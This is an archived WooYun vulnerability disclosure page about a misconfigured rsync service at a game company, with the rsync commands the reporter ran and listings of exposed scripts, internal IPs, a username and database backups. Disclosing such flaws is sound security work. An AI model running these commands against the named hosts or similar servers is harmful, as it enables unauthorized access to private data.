<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		灵娱网络旗下仙战OL系统配置不当导致数据泄漏  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		灵娱网络旗下仙战OL系统配置不当导致数据泄漏  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/盈盈无绪">盈盈无绪</a> 
</li><li>提交时间：		2013-10-26 22:44</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-10-26：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
									2013-12-10：	厂商已经主动忽略漏洞，细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">灵娱网络旗下仙战OL系统配置不当导致数据泄漏<br />
</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"></p><pre><code>rsync 58.68.237.45::software<br />
drwxr-xr-x        4096 2013/10/23 10:04:39 .<br />
-rw-r--r--         861 2013/05/16 11:13:05 add_mycompany_ip.sh<br />
-rw-r--r--     7814288 2013/03/27 14:23:08 apache-tomcat-7.0.37.tar.gz<br />
-rw-r--r--         720 2013/05/21 12:52:05 baidu_rsync.sh<br />
-rw-r--r--        4033 2013/05/14 23:31:33 baidu_version_download.sh<br />
-rw-r--r--     5691656 2012/06/14 15:16:30 cmake-2.8.8.tar.gz<br />
-rw-r--r--         329 2013/04/18 11:48:34 crossdomain.xml<br />
-rw-r--r--        2626 2013/05/21 12:52:05 game_mysql_backup.sh<br />
-rw-r--r--         252 2013/05/21 12:52:05 gameportinfo.txt<br />
-rw-r--r--        1466 2013/05/06 09:25:02 gen_downloadfile.sh<br />
-rw-r--r--         135 2013/05/06 09:25:02 gen_info.sh<br />
-rw-r--r--        1681 2013/05/06 09:25:02 gen_scripts.sh<br />
-rw-r--r--        1668 2013/05/06 09:25:02 gen_uploadfile.sh<br />
-rw-r--r--         207 2013/05/06 09:25:02 get_newinstall_info.sh<br />
-rw-r--r--         405 2013/05/21 12:52:05 get_port.sh<br />
-rw-r--r--    72029394 2012/07/24 18:12:32 jdk-6u33-linux-x64.bin<br />
-rwxr-xr-x        4953 2013/05/08 14:53:52 my.cnf<br />
-rw-r--r--    24499036 2013/03/27 14:24:53 mysql-5.5.30.tar.gz<br />
-rwxr-xr-x       10704 2013/04/18 11:47:51 mysqld<br />
-rw-r--r--      716067 2012/06/14 15:16:42 nginx-1.2.0.tar.gz<br />
-rw-r--r--        5134 2013/05/29 09:49:21 nginx.conf<br />
-rw-r--r--        5261 2013/04/18 11:41:05 nginx.conf.in<br />
-rw-r--r--        5174 2013/04/18 11:41:10 nginx.conf.out<br />
-rw-r--r--     1635262 2012/06/14 15:16:42 pcre-8.30.tar.gz<br />
-rw-r--r--        1561 2013/04/18 11:47:42 profile<br />
-rwxr-xr-x         883 2013/05/08 11:49:01 reload.sh<br />
-rw-r--r--       10523 2013/05/21 12:52:05 sql_diff_new.sh<br />
-rwxr-xr-x         133 2013/04/18 11:41:26 tcpcount.sh<br />
-rw-r--r--           9 2013/05/06 09:25:02 temp.sh<br />
-rw-r--r--          57 2013/04/18 11:39:50 timesyn.sh<br />
-rw-r--r--    12091622 2012/06/14 15:16:45 zabbix-2.0.0.tar.gz<br />
-rw-r--r--        5830 2013/10/23 10:04:39 zabbix_agentd.conf<br />
drwxr-xr-x        4096 2013/10/21 15:30:17 install_script<br />
drwxr-xr-x        4096 2013/10/17 17:00:18 newinstall<br />
drwxr-xr-x        4096 2013/10/20 15:19:45 online_script<br />
drwxr-xr-x        4096 2013/10/16 21:07:39 online_script_1</code></pre><p class='detail'><br />
<br />
查看文件后找到另外一个需要身份认证的rsync的权限<br />
<br />
<br />
<br />
</p><pre><code>rsync rsync://zhangchao@mail.lingyuwangluo.com:8010<br />
dntg           	CVS repository (requires authentication)<br />
xianzhan       	CVS repository (requires authentication)</code></pre><p class='detail'><br />
<br />
<br />
<br />
看看都有啥<br />
<br />
</p><pre><code>rsync rsync://zhangchao@mail.lingyuwangluo.com:8010/dntg<br />
drwxr-xr-x        4096 2013/10/20 02:46:18 .<br />
drwxr-xr-x        4096 2013/05/06 22:19:51 10.69.13.149<br />
drwxr-xr-x        4096 2013/10/21 00:21:38 58.68.251.24<br />
drwxr-xr-x        4096 2013/08/29 03:42:19 fu0_<br />
drwxr-xr-x        4096 2013/10/16 09:07:39 fu0_10.69.13.149<br />
drwxr-xr-x        4096 2013/09/11 03:24:13 fu11_10.69.13.20<br />
drwxr-xr-x        4096 2013/09/23 05:00:46 fu12_10.69.13.21<br />
drwxr-xr-x        4096 2013/10/11 02:11:40 fu169_10.69.1.68<br />
drwxr-xr-x        4096 2013/10/11 04:54:01 fu1_10.68.237.61<br />
drwxr-xr-x        4096 2013/10/10 09:47:38 fu1_10.69.1.89<br />
drwxr-xr-x      131072 2013/09/17 08:27:30 fu1_10.69.13.148<br />
drwxr-xr-x        4096 2013/09/16 10:13:54 fu244_10.69.1.104<br />
drwxr-xr-x        4096 2013/09/25 12:22:28 fu246_10.69.1.136<br />
drwxr-xr-x        4096 2013/09/20 22:45:00 fu247_10.69.1.137<br />
drwxr-xr-x        4096 2013/09/24 07:30:48 fu249_10.69.1.143<br />
drwxr-xr-x        4096 2013/09/28 05:19:35 fu250_10.69.1.144<br />
drwxr-xr-x        4096 2013/09/20 23:25:01 fu251_10.69.1.145<br />
drwxr-xr-x        4096 2013/10/12 10:05:41 fu252_10.69.1.146<br />
drwxr-xr-x        4096 2013/09/14 12:37:53 fu2_10.69.13.147<br />
drwxr-xr-x        4096 2013/09/30 21:12:50 fu324_10.69.1.198<br />
drwxr-xr-x        4096 2013/10/15 02:32:02 fu332_10.69.1.176<br />
drwxr-xr-x        4096 2013/10/05 09:55:05 fu340_10.69.1.171<br />
drwxr-xr-x        4096 2013/10/03 05:57:34 fu341_10.69.1.172<br />
drwxr-xr-x        4096 2013/10/13 10:19:00 fu342_10.69.1.174<br />
drwxr-xr-x        4096 2013/10/03 23:18:53 fu344_10.69.16.47<br />
drwxr-xr-x        4096 2013/10/10 09:54:06 fu346_10.69.1.91<br />
drwxr-xr-x        4096 2013/08/19 04:59:13 fu3_10.68.237.52<br />
drwxr-xr-x        4096 2013/09/05 04:29:25 fu3_10.69.1.206<br />
drwxr-xr-x        4096 2013/09/30 21:15:09 fu436_10.69.19.51<br />
drwxr-xr-x        4096 2013/10/14 04:29:46 fu444_10.69.19.52<br />
drwxr-xr-x        4096 2013/10/18 03:23:18 fu452_10.69.19.53<br />
drwxr-xr-x        4096 2013/09/20 22:13:30 fu4_10.69.1.207<br />
drwxr-xr-x        4096 2013/10/17 01:13:53 fu508_10.69.18.55<br />
drwxr-xr-x        4096 2013/10/09 03:05:08 fu525_10.69.19.24<br />
drwxr-xr-x        4096 2013/10/07 22:54:13 fu596_10.69.18.57<br />
drwxr-xr-x        4096 2013/09/06 05:42:57 fu6_10.69.1.209<br />
drwxr-xr-x        4096 2013/09/11 07:18:19 fu84_10.69.13.159<br />
drwxr-xr-x        4096 2013/09/15 21:21:52 fu85_10.69.16.18<br />
drwxr-xr-x        4096 2013/09/21 03:37:47 fu8_10.69.17.248</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>rsync rsync://zhangchao@mail.lingyuwangluo.com:8010/xianzhan<br />
<br />
<br />
drwxr-xr-x        4096 2013/10/23 12:29:24 .<br />
drwxr-xr-x        4096 2013/10/21 06:20:16 58.68.237.61<br />
drwxr-xr-x      983040 2013/10/26 10:00:02 _<br />
drwxr-xr-x        4096 2013/08/21 23:14:31 _42.121.13.131<br />
drwxr-xr-x        4096 2013/10/15 05:55:37 fu10_10.68.237.59<br />
drwxr-xr-x        4096 2013/10/20 01:54:22 fu11_10.68.237.60<br />
drwxr-xr-x        4096 2013/10/23 12:29:37 fu12_10.68.237.52<br />
drwxr-xr-x        4096 2013/08/14 21:59:28 fu1_10.61.85.113<br />
drwxr-xr-x        4096 2013/10/14 06:55:12 fu1_10.68.237.61<br />
drwxr-xr-x        4096 2013/07/30 11:46:07 fu2_10.61.85.90<br />
drwxr-xr-x        4096 2013/10/05 00:22:32 fu3_10.68.237.52<br />
drwxr-xr-x        4096 2013/10/12 03:34:16 fu4_10.68.237.53<br />
drwxr-xr-x        4096 2013/09/09 04:43:57 fu6_10.68.237.55<br />
drwxr-xr-x        4096 2013/09/29 00:11:35 fu7_10.68.237.56<br />
drwxr-xr-x        4096 2013/10/12 03:33:57 fu8_10.68.237.57<br />
drwxr-xr-x        4096 2013/09/29 01:54:54 fu9_10.68.237.58</code></pre><p class='detail'><br />
<br />
<br />
<br />
在这里发现些有趣的东西<br />
<br />
</p><pre><code>rsync rsync://zhangchao@mail.lingyuwangluo.com:8010/dntg/fu1_10.69.13.148/<br />
drwxr-xr-x      131072 2013/09/17 08:27:30 .<br />
-rw-r--r--      151968 2013/08/14 23:01:46 1.tar.gz<br />
-rw-r--r--      152141 2013/07/19 05:37:46 1.tar.gz_2013-0719-1737.zip<br />
-rw-r--r--         146 2013/08/14 23:02:00 1.txt_2013-0815-1102.zip<br />
-rw-r--r--      151968 2013/08/14 23:06:21 1_2013-0815-1106.zip<br />
-rw-r--r--    30221426 2013/09/17 08:27:30 3.sql_2013-0917-2027.zip<br />
-rw-r--r--        7431 2013/08/14 23:19:03 aaa_2013-0815-1119.zip<br />
-rw-r--r--    23357928 2013/05/09 23:04:59 log2db.tar.gz<br />
-rw-r--r--       39908 2013/05/08 05:03:07 log2db_fu1.sql<br />
-rw-r--r--     1075919 2013/06/17 21:55:52 logs_2013-0618-0955.zip<br />
-rw-r--r--         324 2013/06/30 22:16:49 ping.log_2013-0701-1016.zip<br />
-rw-r--r--   113464702 2013/06/17 05:06:11 statistics_redo.tar.gz_2013-0617-1706.zip<br />
-rw-r--r--     7998214 2013/06/28 06:03:39 statistics_redo_2013-0628-1803.zip<br />
-rw-r--r--    48763796 2013/08/13 06:39:32 update_2013-0813-1839.zip</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>dntg_server]$ ls<br />
config  dntg_start.jar  dntg_stop.jar  lib  log4j.properties  logs  oscache.properties  pid</code></pre><p class='detail'><br />
<br />
<br />
<br />
呵呵<br />
<br />
<br />
<br />
又在里面发现了一个后台的地址，去看看，这个游戏收入还可以。<br />
<br />
就到这里吧，泄露的东西已经很多了，仔细找找会有更多机会的。一个月收入那么多的手游还是<br />
<br />
仔细点比较好。<br />
<br />
<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/26220617692a703a3f05d725c0f0c96b76865a72.png" target="_blank"><img src="../images/26220617692a703a3f05d725c0f0c96b76865a72.png" alt="xianzhan1.png" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/26220633f1c4994b24c80bddd4a4fa7c685e0b0e.png" target="_blank"><img src="../images/26220633f1c4994b24c80bddd4a4fa7c685e0b0e.png" alt="xianzhan2.png" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/26220650ef49963f70de6832a9acd76c0e4aa3b9.png" target="_blank"><img src="../images/26220650ef49963f70de6832a9acd76c0e4aa3b9.png" alt="xianzhan3.png" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/26220701b8ed64fafeca58fda0649a06a876c26e.png" target="_blank"><img src="../images/26220701b8ed64fafeca58fda0649a06a876c26e.png" alt="xianzhan4.png" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/26220717d0bc365914976e715f7b99080a5abfae.png" target="_blank"><img src="../images/26220717d0bc365914976e715f7b99080a5abfae.png" alt="xianzhan5.png" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">安全是个全面的问题。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/盈盈无绪" title="盈盈无绪">盈盈无绪</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041120" title="灵娱网络旗下仙战OL系统配置不当导致数据泄漏">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
									<h3 class="detailTitle">厂商回应：</h3>
										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
																	
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="41120";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
